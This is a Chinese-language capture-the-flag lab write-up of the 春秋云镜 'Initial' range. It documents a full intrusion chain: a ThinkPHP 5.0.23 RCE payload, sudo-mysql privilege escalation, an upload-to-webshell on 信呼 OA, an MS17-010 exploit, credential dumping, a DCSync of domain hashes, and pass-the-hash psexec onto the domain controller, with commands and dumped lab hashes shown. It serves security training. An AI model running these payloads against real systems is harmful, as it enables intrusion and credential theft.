---
title: "春秋云镜 Initial Writeup"
date: 2023-07-28T22:16:09+08:00
lastmod: 2023-07-28T22:16:09+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'domain']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Initial Writeup

<!--more-->

## flag01

入口点

![image-20230728203700498](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282037549.png)

根据 favicon 和报错确定是 thinkphp 5.0.23

```
http://39.99.144.193/index.php?s=xx
```

![image-20230728203912177](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282039206.png)

网上随便找个 exp

```
POST /index.php?s=captcha HTTP/1.1
Host: 39.99.144.193
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

![image-20230728204026019](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282040043.png)

然后写 shell 蚁剑连接

```shell
(www-data:/var/www/html) $ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe0e:db2b  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:0e:db:2b  txqueuelen 1000  (Ethernet)
        RX packets 66233  bytes 65649450 (65.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20340  bytes 7965714 (7.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 786  bytes 71973 (71.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 786  bytes 71973 (71.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

SUID 没啥好东西

```shell
www-data@ubuntu-web01:/$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/su
/usr/bin/chsh
/usr/bin/stapbpf
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

sudo 可用命令

```shell
www-data@ubuntu-web01:/tmp$ sudo -l
Matching Defaults entries for www-data on ubuntu-web01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-web01:
    (root) NOPASSWD: /usr/bin/mysql
```

参考 GTFOBins

[https://gtfobins.github.io/gtfobins/mysql/](https://gtfobins.github.io/gtfobins/mysql/)

```shell
sudo mysql -e '\! /bin/sh'
```

/root 目录下拿到 flag01

![image-20230728205336569](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282053593.png)

## flag02

fscan 扫内网

```shell
www-data@ubuntu-web01:/tmp$ ./fscan -h 172.22.1.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.15     is alive
(icmp) Target 172.22.1.18     is alive
(icmp) Target 172.22.1.21     is alive
[*] Icmp alive hosts len is: 4
172.22.1.18:135 open
172.22.1.2:139 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.15:80 open
172.22.1.15:22 open
172.22.1.18:3306 open
172.22.1.21:445 open
172.22.1.18:445 open
172.22.1.2:445 open
172.22.1.21:139 open
172.22.1.18:139 open
172.22.1.2:88 open
172.22.1.21:135 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo:
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[*] NetInfo:
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetInfo:
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 
[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
[+] 172.22.1.21 MS17-010        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
已完成 14/14
[*] 扫描结束,耗时: 13.517670397s
```

整理一下

```shell
172.22.1.18 XIAORANG-OA01
端口: 135,80,3306,445,139

172.22.1.21 XIAORANG-WIN7
端口: 445,135,139
MS17-010

172.22.1.2 DC01
端口: 135,139,445,88
```

172.22.1.18 信呼 OA v2.2.8

![image-20230728210123571](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282101600.png)

弱口令 admin/admin123

getshell 参考 [https://www.freebuf.com/articles/web/286380.html](https://www.freebuf.com/articles/web/286380.html)

先上传文件

```html
<form action="http://172.22.1.18/api.php?m=upload&a=upfile&adminid=&device=1625923765752&cfrom=mweb&token=&sysmodenum=officia&sysmid=0&maxsize=2" method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit">
</form>
```

![image-20230728221109740](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282211795.png)

拿到 id, 然后访问 `http://172.22.1.18/task.php?m=qcloudCos|runt&a=run&fileid=9` 生成 php, 最后蚁剑连接

![image-20230728212459552](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282124578.png)

因为是 PHPStudy 搭建的网站, 权限很大, 直接就是 SYSTEM 权限

在 Administrator 的家目录下拿到 flag02

![image-20230728212120883](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282121907.png)

*看网上 writeup 的时候发现也能通过 phpmyadmin 弱口令 + sql 写文件打进去*

## flag03

msf 反弹上线之前的机器, 方便打 ms17-010

![image-20230728210708249](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282107283.png)

![image-20230728212649316](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282126355.png)

先收集 windows 机器上的凭据

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username        Domain    NTLM                              SHA1
--------        ------    ----                              ----
Charles         XIAORANG  f6a9881cd5ae709abb4ac9ab87f24617  99439e2268d0f5063928f523d5d44c8d69be7e34
XIAORANG-OA01$  XIAORANG  e5a27a8f96f2a2e742b6cd69e87c739b  b870548b0c00dabf6262942068aeaa2e83440d97
XIAORANG-OA01$  XIAORANG  dc5f050393a7cc83e0518b8015b8b65d  fc0612848c69ce0b4f2afc76e506289e4bc97bd8

wdigest credentials
===================

Username        Domain    Password
--------        ------    --------
(null)          (null)    (null)
Charles         XIAORANG  (null)
XIAORANG-OA01$  XIAORANG  (null)

kerberos credentials
====================

Username        Domain        Password
--------        ------        --------
(null)          (null)        (null)
Charles         XIAORANG.LAB  Charlw0yFl8hx
XIAORANG-OA01$  xiaorang.lab  ...... (略)
XIAORANG-OA01$  xiaorang.lab  ...... (略)
xiaorang-oa01$  XIAORANG.LAB  ...... (略)
```

![image-20230728212812382](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282128411.png)

*伪造 Charles 的身份执行啥命令都是拒绝访问, 之后 impacket psexec.py 连上去的时候才发现是密码过期了...*

打 ms17-010 (在 vps 上打好像有点问题? 所以换成了本机 + proxychains 的方式)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282144590.png)

收集凭据

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username        Domain    NTLM                              SHA1
--------        ------    ----                              ----
XIAORANG-WIN7$  XIAORANG  474d95f0972b89f07c762044841ecb77  5c999df75d96227c3c5da11c228d394db182fe75

wdigest credentials
===================

Username        Domain    Password
--------        ------    --------
(null)          (null)    (null)
XIAORANG-WIN7$  XIAORANG  ...... (略)

kerberos credentials
====================

Username        Domain        Password
--------        ------        --------
(null)          (null)        (null)
xiaorang-win7$  XIAORANG.LAB  ...... (略)
xiaorang-win7$  XIAORANG.LAB  (null)
```

没啥可利用的信息, 不过这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash

本来应该用 BloodHound 或者 PowerView 收集下信息的, 但是时间 (💰) 不够了 (

```shell
meterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
1000    DC01$   edc506302bf9b040febfb84a1459c0e8        532480
1104    XIAORANG-OA01$  673ec2d0ad2f73341c4b3e1fc2fbade5        4096
1103    XIAORANG-WIN7$  507797b66f76b8b71d20555b0c59f86d        4096
```

psexec pth
```shell
proxychains psexec.py -dc-ip 172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 XIAORANG.LAB/administrator@172.22.1.2
```

在 Administrator 的家目录下拿到 flag03

![image-20230728215355537](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307282153581.png)
